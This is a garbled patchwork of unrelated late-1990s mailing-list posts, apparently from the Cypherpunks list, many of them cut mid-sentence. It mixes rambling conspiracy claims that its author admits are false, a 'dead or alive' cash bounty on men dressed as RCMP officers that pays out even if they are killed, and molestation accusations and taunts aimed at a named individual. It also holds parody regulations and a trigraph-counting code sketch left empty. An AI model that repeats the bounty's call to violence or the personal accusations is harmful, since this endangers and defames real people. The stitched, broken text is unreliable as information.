which make me laugh until I pee my pants, drop my dime, and
mess my drawers.
Since the original release of 'The Xenix Chainsaw Massacre' in
1989, I have gathered a following of hackers, crackers, phreaks,
phracks, punks and mental cybermisfits that would provide a
lifetime of research for any psychologist whose goal was to study digitally-based insanity.
Recently, those who have spent years feeding me information to
be released on an "I don't have the foggiest idea what it means"
basis, went underground, for the most part, as  a result of a
variety of attacks directed toward them by those who wish to
control and manipulate each and every aspect of the Brave New
Digital World.
Nonetheless, today I got a syruptacious message from the grand
personage known only as the Evil-1, informing me that, although
the Usual Suspects involved in taking control of my InterNet
accounts have faded into the background, due to a sharp rise in
the monitoring of my account, unknown player/warriors have come
out of nowhere to throw a serious fuck into the ISP which so
high-handedly murdered my WebSite, without a single word of
explaination to myself or anyone else.
The Evil-1, sending me a private email (using the
SysAdmin account at the Well), informed me that some kind soul
has turned the programs used to surrupticiously monitor my email communications into global programs which perform the
same tasks on the account of each and every customer of my
ISP, thus tying their tubes in a knot that  cannot be undone
by anyone they have on staff, or by the professional computer
spooks that have been imported to build a coherent conspiracy
out of my mad ramblings.
As well, a dear lady friend (who has been instumental in making
the dev.null server a living reality for the better part of a
decade) informs me that a variety of hackers and crackers who
are only peripherally connected to the HyperPukes Distraught
Baleing-Twine List, seem to be involved in accessing my ISP's
computers to perform mysterious tasks that have purposes that
even she cannot divine, with the enormous amount of tools and
resources at her fingertips.
To quote her directly, "The esteemed Lost Alamo Boys and Girls
4-H(orsemen) Club is unanimous in their opinion that the highly
professional and superbly trained guerilla units of the Magic
Circle are in no way superior to the unknown entities currently
crawling out of disparate locations of the cyberwoodwork to
lend a confusing hand to a common goal which is shared by none
and championed by all."
In short, it seems be the general consensus among those who have
spent years dogging my CyberTrail as a result of my use as an
expendable schill suitable to act as a front-man/target for the
dissemination of innocuously dangerous manuscripts, that the
'creme de la creme' of ZOG's MeatSpace CyberGestapo is sucking
hind-tit to an untraceable, unorganized, Cult of One/Army of Dog
pseudo-phenomena that is very likely composed mostly of Doodze
and Doodzettes who spend more on Clearasil than the NSA and DOD
spend on computer security, combined.
Lest you, as a CypherPinko, think you can get away with dismissing
the preceding as the mad ramblings of a psychotic, drunken, mental
case under the influence of bizarre combinations of legal and illegal drugs (which is, actually, the case), stop and think about
the things that you, yourself, have done over the course of your career as a part-time miscreant, during which you have performed inexplicable feats of derring-do which were far beyond your capacity, given your technological expertise and experience, but which were brought to successful fruitation by virtue of the clarity of purpose and the strength of committment that you brought to the activity.
If you have made a habit of selling yourself short for your seeming
accomplishments because you convinced yourself that you, and your
accomplishments, are 'ordinary', then you need to review your life,
your actions, and your accomplishments, while keeping a Taoist eye
open, and a Taoist ear cocked, for the subtle signs of a Magic at
work which goes beyond Mathematics and steps into the arena where
Conscious Will defines the paridigms within which Reality is manifest according to the dictates of Dreams and Desire.
Despite my obvious dysfunctionality in a world which demands a strict
adherence to the Norm (TM), I reign supreme as a Prophet and Conspiracy
Theorist Extraordinaire.
"We make our Gods, and do battle with them...and they bless us."
~ Herman Hesse ~
Anyone who honestly researches the wildest of the claims made in
the 'True Story Of The InterNet' manuscripts will be able to prove
for themselves the reality of even the most preposterous of the
wild and weird pronouncements of collusion between a far-reaching
network of Circle of Eunuchs conspirators.
Those who check the details surrounding the warnings to Jim Bell
shortly before his persecution, the arrival of the son of gomez
on the doorstep of his mentor mere hours before gomez was cut
loose from a company he had founded a decade and a half earlier,
the synchonicitous messages from the L.M. Boyd sampler and the
A.Word.A.Day bulk emails mirroring releases of the 'True Story'
manuscripts, the coincidences of timing between major events in
the story of the Unabomber and the activities of the Author, ad
Those who diligently and honestly check the MeatSpace details
surrounding the space-time continuum of these events will be
left with no doubt that the true, discernable facts surrounding
the events are perfectly consistent with the claims of the
'True Story' manuscripts that there is an underground movement
in the computer industry which supports, confirms and enhances
the work of separate guerilla cells working independently, yet
within a concrete and discernable paradigm encompassing a common goal.
The Truth, The Whole Truth, And Nothing BUT The Truth:
[Note from the Otter: I have every reason to believe that
 I am currently 'marked for deletion' from the List (TM)
 of those whom the DickMongers can't be bothered butt-
 fucking just yet, so anyone who dares to suggest, in the
 remotest corner of their mind, that I have anything to
 be gained by embellishing or distorting the Truth in  regard to my most dearly held beliefs, based on my life
 experiences...can go fuck themselves.
 OTOH, anyone who wishes to discount what I am about to
 say on the basis that I am a drunken, psychotic drug-
 addict with a slim hold on Reality (TM) probably has
 a case that would hold up when pleaded before a jury
 of Phillip Hallam-Baker's peers.]
All of the wild and preposterous claims made in the
'True Story of the InterNet' manuscripts, in regard to the verifiable trails of intrigue connecting the Author
with the pesonages and events of a wide variety of deeply meaningful events in the battles between the
Forces of Light and the Forces of Darkness taking place
on the battlegrounds in Waco, Ruby Ridge, San Diego,
Sacramento, etc., etc., are Total HorseShit (TM) in
the world of MeatSpace, and Totally True (TM) in the
world of Reality (TM).
You see, Reality (TM) is nothing more nor less than the fulfillment of the totality of our individual thoughts, beliefs, hopes, dreams and actions. And the
Spheres of Reality encompass physical and virtual territories ranging from the MeatSpace and MindSpace
bounded by an individual Cult of One persona, to the
time-space continuum bounded by Infinity and Eternity.
In short, when the Author's missives are supported and confirmed by a web of totally unrelated facts and circumstances which consistently mirror the wild and
outlandish claims being made, it is because when any
living entity in the universe takes a step in a self-
willed direction, the underlying fabric of the Tao
changes shape to bring itself into alignment with the
consciously willed goal of that entity.
The True Battle (TM) taking place within the confines
of MeatSpace Reality is the battle of conscious, self-
willed individuals writing Reality Scripts capable of
balancing and/or overcoming the Generic Reality being
written by the more numerous Sheeple following the Scripts written by their Masters.
Women and men who consciously contribute to the daily
construction of Universal Reality influence the basic
structure of the Universe to a greater degree than a greater number of Sheeple who are heading in a different direction, but who scatter back and forth,
being kept only intermittently on course by the dogs
which nip at their heels.
"Let us each choose a Vision,
 Let us each choose a Dream.
 Let us each write a Chapter of Life,
 On our own Silver Screen."
~ 'You Can't Kill A Dream, Or A Dreamer', C.J. Parker
Anyone who wishes to join Tim May in dismissing the preceding as an example of laughable 'Magical Thinking"
having forgetten that Mr. May is simply a senile old fart who can't even find his shoes, is free to do so.
However, no amount of skepticism and derision will change the fact that the sincerely professed insanity
contained in the 'True Story' manuscripts lead to an
incontrivertable confirmation of their validity within
the confines of the MeatSpace time-space continuum running parallel to their release.
Anyone who wishes to avoid facing the reality of what
is being suggested in this rambling missive by a mentally unstable, alcoholic, drug-addicted terrorist
pedophile, in order to preserve the sanity that can
be maintained by dismissing the Truth when it leaks
from the lips of the deranged and depraved, should avoid reading the chapters of 'Space Aliens Hide My
Drugs' which lightly tread the boundaries of Unfortunately, mathematics, biology, physics and psychology are rapidly converging around a model of
the universe which suggests that each and every entity capable of receiving, emitting, categorizing
and acting on information data and processes ranging
from the inherent structure of DNA to convoluted
discourses on Quantum Physics, is not just a 'product' of its universal environment, but also an active 'creator' of that universal environment.
In short, though you may easily dismiss my wild claims that the ramblings of a mad Author are actively
creating the universe which you inhabit, it is highly
unlikely that you will be able to avoid the semi-
sensible posts of Jim Choate to the list concerning
those who are defining the new frontiers of science
with provable theories every bit as nonsensical as
those of Einstien, or be able to ignore the highly
organized trails of hard facts and figures provided
by John Young's website, confirming the bizarre reality of the Author's neurological nightmares and Choate's cutting-edge scientific dreams being brought
to fruitation and manifested in the established MeatSpace chronicles which Dr. Young provides for
the edification of unbelievers, during the functional
periods of lucidity he experiences in between his
mad rampages into the depths of drug-induced insanity.
In effect, those who fail to understand the true import
of the Biosemiotic basis of the conjoined evolution of
mind and matter are doomed to exit this life still
believing that they were predestined to become a side-pocket combination shot of Universal Fats, the
prime mover of all that exists, instead of realizing
that, at any point in time, they were free to change
the nature and direction of the Game (TM) by declaring,
"Damn the CueBall, full speed ahead!"

WANTED / DEAD OR ALIVE!
I will pay a CA$H REWARD for the capture of the Armed Thugs who broke
into my Bienfait residence and stole a variety of computer items,
including a computer, computer peripherals and personal documents.
The CA$H REWARD will be also be paid if those recovering the stolen
items are forced to engage in actions of self-defense, resulting in the
death of the criminals.
Witnesses report that the perpetrators of the crime were dressed to
resemble members of the Royal Canadian Mounted Police, were heavily
armed, and appeared willing to violently attack anyone interfering with
their criminal activity. Their audacity in perpetrating the crime in
broad daylight indicates that they are professional criminals with
little regard for the consequences of their actions.
Suggestions that those of  Native Ancestry would ï¿½Shoot first, and ask
questions later.ï¿½ should probably be ignored, since it is unlikely that
common criminals harbor the same propensity for  racial violence that is
exhibited by legitimate members of the RCMP.
Any person or persons engaging in the capture of the criminals and the
recovery of the stolen property should take care to avoid violating the
legal or  Charter Rights of the criminals, unless said person or persons
are representatives of an officially recognized law enforcement agency.

Why don't you just tell you child-molesting friend Gary Lee Burnore that if
he would keep his pants zipped up around the children, he wouldn't need to
hire you to fight his battles.  If he didn't molest a child in Santa Clara,
CA and then move to NC and register as a sex offender, the fact of his
conviction for that crime wouldn't have been published for all to see on
Nort Carolina's public registered sex offender's website, would it?  Just
because you don't like the message, don't shoot the messenger.  This was
the same loud-mouthed Burnore that previously said that republishing
publicly available data to Usenet was acceptable, and that he had nothing
to hide.  Now he's pissed that someone else is following his own example.
Anti-privacy kooks like you and DataBasix CEO Gary Lee Burnore are one of
the best arguments for the existence of anonymous remailers.  You and your
friends at DataBasix have a hard time bullying and harassing people into
silence that you can't identify, don't you?
Lest anyone forget, Gary launched his first tirade against anonymity when
someone tipped off his molestation victim's mother and school officials
anonymously.  Whistleblowing has always been one of the important functions
of anonymous remailers.  Of course, Gary denied the charges and accused the
victim's anonymous benefactor of "harassment" and "libel".  Now the public
record shows that Gary was guilty after all, by his own admission and
guilty plea.
Belinda, if you want to make Gary's "miserable life an absolute hell", why
don't you just marry him?

Keep in mind that Timothy McVeigh thought he had anonymity with his
use of a prepaid 'anonymous' phone card over public payphones. He was
wrong. The testimony in this regard at McVeigh's trial was 'fixed'--not

It was this very Prince Apia of Physics that allowed Linda McCartney to
be secretly buried as an imaginary driver in the log book of a finely

outside the jurisdiction of the Kansas Control Commission, thus allowing
the Bug to be hidden outside of the prying blinds of the papparazzi,

herd-responses to keep her books off of the best-seller lists, while

citizens, in the process.

Your own record of harassing remailers is well known, McClatchie.  Calling
remailer users "assholes" and calling for content-based censorship only
underscores your anti-privacy agenda.  If remailer users posted only what
was popular and politically correct, there would be little need for
One remailer operator who was forced to shut it down mentioned your name
quite prominently, BTW, in providing details about the attack.
Can you document this?
 I never read a single post from anyone claiming to
speak for Wells Fargo management which has substantiated this.  Nor did
any of the remailer operaters involved mention having received such an
official complaint from member of Wells Fargo's management.  So all we
have is you parroting Burnore's original unsubstantiated allegations.
Isn't it interesting that when something offends Gary Burnore he often
resorts to "defending" phantom victims of the alleged "abuse"?  And shortly
thereafter, various of his sock puppets echo his whining chant.
And one such post contained Gary Burnore's own .sig block still appended to
an otherwise anonymous post.  Oops!
Please cite the NC law which you claim is being violated, and how it would
apply to a remailer located outside of NC?  Would you also say that
remailers ought to censor their content to avoid other laws being broken,
such as insulting the religion of Islam, publishing information about birth
control, abortion, etc.?  If not, why should a foreign remailer selectively
enforce this one law in NC (if it even exists)?
Telling people that the website exists and that a search for "Gary Lee
Burnore" on it might yield a match is not more "harassing" than the site
itself.  If they didn't want people to access this data, why publish it on
a public website?  The whole purpose of the website it apparently to let

Wow, McClatchie.  I guess you have a point.  If you and Gary claim that all
that happened, and that it was done by someone outside of DataBasix, then I
guess we should believe it and shut down all the remailers just to make
sure they aren't abused...
But the fact is that all too often in the past, designer "abuse" would just
automagically appear at critical times when Gary Burnore and Belinda Bryan
were making demands (privately, via e-mail) on another remailer operator.
How would someone outside of DataBasix have known that?  How would someone
other than a DataBasix insider have gotten access to the complete list of
DataBasix' clients and employees in order to allegedly "spam bait" them, as
Belinda claimed?  Your own involvement in all of these attacks seems to
more than just coincidental.
Speaking of abuse and harassment, Gary Burnore demanded that Jeff Burchell
turn over to him all of his remailer logs containing the e-mail addresses
of everyone who had either sent or received anonymous e-mail through the
server.  Yet Gary refuses to disclose how such a list would have been used.
Fortunately for the remailer user community, no such data was ever
Most women would not consider it "harassment" to be informed that their
daughters were being molested.  Nor did she complain.  Gary did!  How nice
of the perpetrator to be so considerate of his victim's mother and not want
to have her "harassed" by knowledge of what Gary was doing to her daughter.
Ignorance is bliss, huh?
Gary's motives were finally revealed when he was CONVICTED for that very
crime.  How would a random harasser have even known of Gary's sexual
activities involving minors, before he was arrested and convicted?  How
would he/she know the victim's gender, age, identity, and city of
Apparently so, when the perpetrator of the crime is the only one who
complains about being exposed.  In case it has escaped your attention, Gary
complained PUBLICLY about a PRIVATE e-mail message to his victim's mother.
If telling a mother that her daughter is being molested isn't
whistleblowing, what is?
TRANSLATION: Anything with which the fine folks at DataBasix disagree tends
to be called "harassment" and "abuse".  As for intent, the accuser has the
burden of proof, there.
But consider this: if even mentioning Gary's sexual activities with minors
is "vile", what does that make Gary for actually committing them?

Oh, it's sick anyhow...
A couple excerpts from jya's transcript:
On the EFF DES cracker: Now, I need to explain first of all, that the
government is currently permitting the export of 56 bit encryption
algorithms.  Now, I know that there's some huffing and puffing about
whether that's strong encryption or not. But again, I say let's put this
in context.  There was a flap here the other day when, ta-da, somebody
invented a computer that could break 56 bit encryption in 30 hours or 40
hours or whatever the time was, right.  You took 40 hours to decrypt a
two-second message.  And it was good only for that one message.  You've
got to start all over again on the next two-second message.  Tell me that
that isn't strong encryption.
[Secretary Hamre, that isn't strong encryption. Weak enough that cracking
DES keys for two grand each -- reasonable price considering some of the
applications using DES -- can be a viable business for the shady hacker
type, in fact. Pays for your parts in ten months, pocket most everything
else until the machine breaks.]
On export controls: "...I'd also ask American business not to make a
campaign out of just trying to bust through export controls as though
somehow there was a God-given, inherent right to send the strongest
encryption to anybody in the world, no matter who they are.  I don't agree
with that.  I will never agree with that."
["I will never agree with that" -- I'd say we're talking to an open-minded
individual who's really trying to work things out, eh?]

A good data structure is a tree:
                   ----->  2nd letter
                  /                    ------> 3rd letter
                 /                    /
      1st letter ------->  2nd letter -------> 3rd letter
                 \                    \
                  \                    ------> 3rd letter
                   ----->  2nd letter
                                      \
                                       -----> 3rd letter
Start with an array indexed by the 26 letters.  Each array entry contains
a count of that letter's frequence and a pointer to a subsidary array.
The pointer starts out null.
When you find a new digraph (like the first time you find a letter after
'g') you allocate a new structure to represent the letters following 'g'.
This will again consist of 26 entries like the first one.
Likewise when you find a new trigraph, you allocate a new third-level
array of 26 entries.
This will be a compromise between space and speed.  Most digraphs don't
exist so you will save considerable space over the brute force way of
allocating an array of 26^n spaces to count n-graphs.  However it is
a bit wasteful in that it allocates a full 26 entries each time even
though only a small fraction will be used.
The last layer does not need to have the pointers allocated per letter
since you won't be looking beyond that (e.g. if you are only interested
in counting trigraphs, the third layer above can consist of just an
array of counts).
struct entry {
} top;
Handle letter, given array of previous letters.  prev[0] is current
letter, prev[1] is 1st previous letter, prev[2] is 2nd previous letter,
etc.  Size of prev is n entries.  Letters are normalized to range 0-25.
Untested code, hopefully it will give you the idea.
handle (int prev[], int n)
this when you print them out.  Or you can store the letters in the prev
array in the opposite order, putting the current letter in prev[n-1],
then they will be in the correct order.

[Porker's lame quoting style retained.]
So use an ISP which doesn't have the horrible reputation that AOL and its
users have earned. You continue the grand AOL tradition of spreading
lameness throughout the Internet. Because AOL is now "32 bit" (oh brother) AOL users are suddenly not
idiots. Right. I guess all the AOLholes who were posting requests for LSD
manufacturing, hacking banks, and band stickers were using "16 bit AOL." The number of bits AOL's software uses has nothing to do with it. AOL gets
ragged on because their (publishing to the Internet) userbase is composed
mostly of total morons and because they go try to sign up every idiot they
can find with a "50 hours free stupidity/spamming fest" disk. Their
software is designed to allow a trained chimp to use the Internet, and -
surprise, surprise - that's what we get most of the time.
Of course not *all* AOL users are idiots, but enough are to make the
stereotype valid.
If AOLers want to stop being made fun of, then get AOL to stop catering to
every moron they can find and saying "AOL is the Internet." Stop using
this lame and annoying "<< >>" quoting style. (Before somebody jumps on
that, there have been at least four or five Cypherpunks who have
publically bitched about it here and other people have complained about it
elsewhere.) Stop posting requests for music, band stickers, books, pipe
bombs, hacking info, and other such junk to mailing lists where it's
inappropriate and to inappropriate USENET newsgroups. At least try to put
some effort into formatting your posts so that they don't have line breaks
in bizarre places, don't underuse or overuse punctuation, and try to use
some proper capitalization.
AOL brought this on themselves. At least they send me free coasters and
mirrors every other week. If it wasn't for the very rare useful post from AOL, I'd have my system
killfile mail from AOL going to the Cypherpunks list like I do for my

comp.software.year-2000 by Paul Milne, resident doomsayer, foul-mouthed
religious fanatic, economic Marxist, and all around kook.  It prompted a
very knowledgable reply which pointed out how silly the whole idea was,
from someone with relevant experience.  Maybe next time Detweiler could
check c.s.y2k to filter out North's nuttier ideas before forwarding
them here.

I'm not sure if I want to play this game Mr. Milne -- you offer this
article which is, conjecture, innuendo and supposition but demand that
any counter story be documented by "evidence."  That's pretty tough and,
frankly, I'm not up to the task as my knowledge is with electric power
plants -- not oil refineries.
They do, of course, share some important characteristics and so I'll
give it a try.  The approach will be from two perspectives -- first,
I'll explain some power plant construction practices that contradict the
refinery story; second, I'll offer another review of the nature of the
"embedded" systems that might be at issue.
Power Plant (and refinery) construction . . . .
Remember, power plants and refineries are:
o Capital intensive
o Make increased use of computerized process control systems
o Operate a continuous manufacturing/conversion process employing high
temperatures and pressures.
Typical design life of a coal-fired power plant is 40 years.  During
that period, any number of components *will* fail and *will have to be
replaced.*  Wouldn't make much sense to put a $500million investment at
risk 'cause a $20.00 part failed in some inaccessible location.  Thus
EVERYTHING is accessible.
You want evidence and I'm not about to take you on a power plant tour
but even if you've never been inside a power plant the construction
practice is similar to that found in many other industrial settings and,
if you've ever been aboard a naval vessel or taken a cruise, ships. These settings are nothing like your home (or even an office) with all
the infrastructure components nicely hidden behind walls -- pipes are
exposed and clearly labeled -- power and control cables are laid in
exposed cable trays and risers.  Electronic components are often mounted
in racks with easy access from front and back -- probably not at all
like your computer or home theatre configuration.  All this is to PERMIT
MAINTENANCE, REPAIR and MODIFICATION.
So you need to understand that the problem isn't just maintenance, in
general, or for y2k.  Process plants need to be modified frequently --
market conditions demand a change in inputs or outputs.  Can't get
enough sweet crude?  Exxon doesn't close the refinery -- they modify it
to handle the new feedstock (I got the grand tour from a fellow I knew
who worked at Exxon's Baton Rouge refinery, years ago).
Want some pictures?  Here are a few from several "continuous process"
industries:  and
Now consider the nature of these embedded components.  This has been the
subject of much discussion in csy2k.  I'd like to suggest that there are
three broad categories of components in this context:
o The control system(s) -- SCADA -- one or more intelligent nodes build
on traditional minicomputer, or more recently, microprocessor-based
server technology.  These are very accessible -- they're in, adjacent
to, or very near, the control room.  In an even more modern "distributed
control system," some of the capability will be located in different
areas of the plant.  Nevertheless, they still have to be very accessible

I cannot give such example because hard crypto products are not available to
the general public.
I am unaware that microshit OS has hard crypto built-in. The only hard crypto
package I have ever seen for sale at mail-order (and thus not anonymous) is
NAI's PGP (and I have never seen any hard crypto available in a store for cash
- but that can only mean that there is no perceived demand).
However, any hard crypto that would work on system level and encrypt all
communications is not available for purchase (it is available for free,
though, in the form of IPSec package with 128-bit block ciphers for
*BSD operating systems.)
There is a number of VPN companies that offer crypto boxes, but AFAIK they
either do not mention crypto scheme they use or they say DES. There is
only one VPN company that advertises 128-bit crypto in it's product.
You'll miss all the fun. After talking to 5-6 departments one concludes
that no one knows anything about 4758, but they are all nice and helpful,
and forward your call to each other. 4758 does not exist for casual callers.
My guess is that if you have been dealing with IBM for some time you may
be able to get it.
To recap, there are no hard crypto drop-in hardware products available to
general public in the USA today.
The question is how to make money by selling hard crypto in the US. NAI seems
to be the only company that can get away with so-called "publishing exception"
in the commercial world. Their joining the key recovery alliance is probably
unrelated :-)
There are many neat ideas. But no hardware.

Know Your Spineless SheepleNeighbor(TM)
If the banks can be required to Know Their Customers, maybe you
can be required to Know Your Neighbor. This is already an established system in Cuba, so importing it should be cheap,
fast and easy.
"Know Your Neighbor" Requirements
AGENCY: Federal Bureau of Investigation
ACTION: Notice of proposed rulemaking.
SUMMARY: The FBI is proposing to issue regulations requiring
FBI-supervised citizen-residents to develop and maintain "Know Your Neighbor" programs. As proposed, the regulations would require each citizen-resident to develop a program designed to determine the identity of its neighbors; determine its neighbors' sources of gossip and political views; determine the normal and expected comings and goings of its neighbors; monitor household activity for things that are inconsistent with those normal and expected activities; and report any activities of its customers that are determined to be suspicious, in accordance with the FBI's existing suspicious activity reporting regulations. By requiring citizen-
residents to determine the identity of their neighbors, as well as to obtain knowledge regarding the legitimate activities of their neighbors, the proposed regulations will reduce the likelihood that citizen-
residents will become unwitting participants in illicit activities conducted or attempted by their neighbors. It also will level the playing field between citizen-residents that already have adopted formal Know Your Neighbor programs and those that have not.
Minimum steps to take to comply with the Know Your Customer rule.
Identify the neighbor.
Paragraph (d)(2)(i) requires that the Know Your Neighbor program provide a system for determining the true identity of prospective neighbors. If a citizen-resident has reasonable cause to believe that it lacks sufficient information to know the identity of an existing neighbor, paragraph (d)(4)(ii)(A) also requires that the program provide a system for determining the identity of that Determine the source of people and property.
Paragraph (d)(2)(ii) requires that the Know Your Neighbor program provide a system for determining the source of a neighbor's possessions and household members. The amount of information needed to do this can depend on the type of neighbor in question.
Determine normal and expected comings and goings.
Paragraph (d)(2)(iii) requires that the Know Your Neighbor program provide a system for determining a neighbor's normal and expected comings and goings involving the citizen-resident. A citizen-resident's understanding of a neighbor's normal and expected comings and goings should be based on information obtained both when a neighbor relationship is established and during a reasonable period of time thereafter. It also should be based on normal comings and goings for similarly situated neighbors.  Without this information, a citizen-
resident is unable to identify suspicious comings and goings.
Determine if activity should be reported.
Once an activity is identified as inconsistent with normal and expected
behavior, paragraph (d)(2)(v) requires that a citizen-resident
determine if the activity warrants the filing of a Suspicious Activity
Report. This is consistent with a citizen-resident's existing obligations under 12 CFR 353.3(a).
A.	Reasons for and objectives of the proposed rule.
The proposed Know Your Neighbor rule is designed to deter and detect
neighborhood crimes, such as plots to establish "Constitutional
government," gathering of information about alleged "crimes" committed
by government agents, and meeting to discuss subversive literature
such as the Constitution.
B.	Requirements of the proposed rule.
The proposed rule would require citizen-residents to identify their neighbors, determine their neighbors' normal and expected activities, determine their neighbors' sources of possessions and
household members, monitor neighbors' activities to find those that are not normal and expected, and, for activities that are not normal and expected, identify which are suspicious.
Know Your Neighbor monitoring would be similar to monitoring that citizen-residents already do. For example, citizen-residents monitor neighbor activities to ensure that comings and goings
exceeding 100 per month are reported under the Neighborhood Secrecy Act, to ensure that neighbors do not overuse their driveways and
sidewalks, and to ensure that required comings and goings accurate and timely. Editor's Note:
The worst part of this parody is that it's true. Cuba, like most
communist dictatorships, has a highly developed system of block
watchers. They are responsible for all of the foregoing, making
their reports to the secret police.
The U.S. government is instituting a system of "bank account watchers,"
toadies in the supine, excruciatingly closely regulated banking
industry, who will have to "know you," get to know your normal and
expected bank account activity, and watch your bank account activity
to detect and report "Suspicious Transactions."
Welkomm to Orwell's 1984. Welkomm to Nazi Amerika. Hold your arm out
straight... there... this will just sting a bit...
Does anyone not get it yet?
There is _nothing_ in the Constitution that gives the federal
government any power to subject the American people to financial surveillance, to restrict or require reporting of
cash transactions in any quantities, to restrict or encumber
firearms ownership to anyone not actually serving time in a prison, or to do _any_ of the onerous abominations being thrust upon us in new and terrible forms almost daily.
Does anyone not get it yet?
The federal government is forfeiting, just as fast as its
android minions can think up new ways to do it, its last
shreds of any claim to legitimacy. They may as well fly
the skull and crossbones over government buildings. Their
occupation army of marauding thugs is _here_, bringing to
ghastly life the very words of the bill of particulars
laid against King George III of England by the Founders
of this now-decayed, now-corrupt, hollow Republic, in the
Declaration of Independence.
Do they _never_ learn? (Obviously not)
Will we _have_ to go through it all again? (Obviously yes)
Has the line been crossed? (Obviously yes)
Has force been initiated? (Obviously yes)
Has the federal government placed itself outside the law?
(Obviously yes)
So be it.

Know Your Gutless SheepleCustomer(TM)
Let's just take a peek at how the new FDIC proposed reg would
look if transposed into an FCC setting:
"Know Your Customer" Requirements
AGENCY: Federal Communications Commission
ACTION: Notice of proposed rulemaking.
SUMMARY: The FCC is proposing to issue regulations requiring
FCC-supervised communications carriers to develop and maintain "Know Your Customer" programs. As proposed, the regulations would require each carrier to develop a program designed to determine the identity of its customers; determine its customers' sources of communicated information; determine the normal and expected calls of its customers; monitor account activity for calls that are inconsistent with those normal and expected callss; and report any calls of its customers that are determined to be suspicious, in accordance with the FCC's existing suspicious activity reporting regulations. By requiring communication carriers to determine the identity of their customers, as well as to obtain knowledge regarding the legitimate activities of their customers, the proposed regulations will reduce the likelihood that communications carriers will become unwitting participants in illicit activities conducted or attempted by their customers. It also will level the playing field between
carriers that already have adopted formal Know Your Customer programs
and those that have not.
Minimum steps to take to comply with the Know Your Customer rule.
Identify the customer.
If a communication carrier offers private leased communication services, it is important that the carrier understand a customer's personal and business background, source of information to be communicated, and intended use of the private leased communication services.
The extent of the information regarding the customer that may be necessary to fulfill the carrier's Know Your Customer obligations should depend on a risk-based assessment of the customer and the calls that are expected to occur, and should be addressed within the communication carrier's Know Your Customer program.
Determine the source of information.
Paragraph (d)(2)(ii) requires that the Know Your Customer program provide a system for determining the source of a customer's information. The amount of information needed to do this can depend on the type of customer in question.
Determine normal and expected calls.
Paragraph (d)(2)(iii) requires that the Know Your Customer program provide a system for determining a customer's normal and expected calls involving the communication carrier. A carrier's understanding of a customer's normal and expected calls should be based on information obtained both when an account is opened and during a reasonable period of time thereafter. It also should be based on normal calls for similarly situated customers.  Without this information, an institution is unable to identify suspicious Monitor the calls. Paragraph (d)(2)(iv) requires that the
Know Your Customer program provide a system for monitoring, on an ongoing basis, the calls conducted by customers to identify calls 'that are inconsistent with the normal and expected calls for particular customers or for customers in the same or similar categories or classes.' The proposed regulation does not require that every call of every customer be reviewed. Rather, it requires that a financial institution develop a monitoring system that is commensurate with the risks presented by the accounts maintained at that Determine if call should be reported.
Once a call is identified as inconsistent with normal and expected
calls, paragraph (d)(2)(v) requires that a communication carrier
determine if the call warrants the filing of a Suspicious Activity
Report. This is consistent with an carrier's existing obligations
under 12 CFR 353.3(a).
A.	Reasons for and objectives of the proposed rule.
The proposed Know Your Customer rule is designed to deter and detect
communication crimes, such as obscene phone calls, getting tax advice, and discussing the Constitution.
B.	Requirements of the proposed rule.
The proposed rule would require communication carrier to identify their customers, determine their customers' normal and expected calls, determine their customers' sources of information communicated in calls, monitor calls to find those that are not normal and expected, and, for calls that are not normal and expected, identify which are suspicious.
Know Your Customer monitoring would be similar to monitoring that communication carriers already do. For example, communication carriers monitor customer calls to ensure that calling volumes exceeding 10,000 per month are reported under the Communications Secrecy Act, to ensure that customers do not overuse their telephones, and to ensure that required calls are accurate and timely. Editor's Note:

and unconstitutional, doesn't it? Where do these fuckers get

11. If the answer to (10) was Yes, do you have a current
    and valid waiver for that (those) organization(s)?
    Yes__  No__
12. If the answer to (11) was No, proceed directly to
    federal prison. Do not pass urine; do not collect
    $200 from any ATM.
13. Do you regularly call your mother?  Yes__  No__
14. If the answer to (13) was Yes, list the topics you
    commonly talk about with your mother (use extra, etc.)
15. What are your sources of information for your
    telephone conversations?____
16. List all facts known to you, about which you expect to
    speak in your telephone calls:____
17. List all times at which you expect to receive or place
    calls:____
18. Attach transcripts of all conversations you expect to
    have. In lieu of transcripts, recordings may be attached.
19. Staple this form to your head, jam a toilet plunger
    handle up your ass, waddle to the nearest telephone,
    dial "1" and say, "I'm ready. Pick me up." Wait at
    your front door.

Hello, I'm Special Agent Murfrock of the IRS and this is Special Agent Prenfrew. We'd like to speak with you about C. J. Parker, maybe known to you as "Toto" or "TruthMonger..."
Sorry, I don't recognize any of those. Isn't Toto the dog?
The dog?
Yes, Dorothy's dog in... (stops when he notices that the agents are
scribbling furiously in their notebooks)
May we come in?
No, I was just about to go to sleep. I'm not well.
Sorry to hear that. We have an e-mail here that you sent to Toto, and another he sent back to you...
May I see those? (takes the printouts)
Sorry, doesn't ring a bell.
Well, if you look at those headers, the ones circled in red, you
will see that...
You must be kidding! There are more people forging e-mail headers
than live in St. Louis! Everybody knows that.
Would you mind if we just come in for a moment?
Yes, I would. I told you, I am going to sleep.
Would you mind if we look at your computer?
Why would you want to do that?
Well if you didn't send or receive these messages, you have nothing to worry about.
I don't see any reason to do that.
We can get a warrant, very quickly, as a matter of fact. If you
cooperate, things will go better for you.
I love to cooperate. I want to cooperate. I am cooperating to the
fullest extent I believe is required of me. Ask me something that

Have you ever heard of a group called the Cypherpunks?

Are you a member?
How do you explain the fact that we found your e-mail address on
a Cypherpunks membership list in a computer we seized?
I have no idea. I don't join organizations.
Are you a member of the Majordomo organization?
No. The only majordomo I've ever heard of is a mail list manager.
Where have you seen this Majordomo?
Oh, everywhere. I think it's worldwide in scope.
(scribble scribble)
It's some kind of utility program. Everybody uses it.
(scribbling stops)
What can you tell us about it?
Nothing, really. If you want to get on a mail list you send a
"subscribe" message to a majordomo. If you want to get off, I
think you send an "unscrive" message.
Have you ever done that?
Maybe. I don't recall. Anyone can submit your e-mail address to lists, so you don't even have to subscribe to be on an e-mail list. And there's so much spam these days that I don't recognize half the stuff I get. Spam? (the agents look at each other)
Junk e-mail. I delete most of my e-mail without even reading it.
Sometimes my email program crashes and it all gets deleted before
I can look at it.

How many lists have you joined?
I don't remember. I never paid any attention to those things,
and since I banged my head three months ago, I haven't been
remembering a lot of things.
(scribble scribble)
So, are you denying being a member of the Cypherpunks?
I don't know what that means.
Have you ever subscribed to the Cypherpunks e-mail list?
I have no idea.
You have no idea? You don't remember?
I don't know what I've subscribed to, unsubscribed from,
what I get, don't get. E-mail is a complete mess and I

I write for a magazine and a couple of newspapers.

you'd like to tell us.
One more thing. Have you ever been invited to join something
called The Circle of Eunuchs, e-u-n-u-c-h-s?

Pre-schoolers'R'Us. You got a visit from the advance guys.
Admissions, admissions.

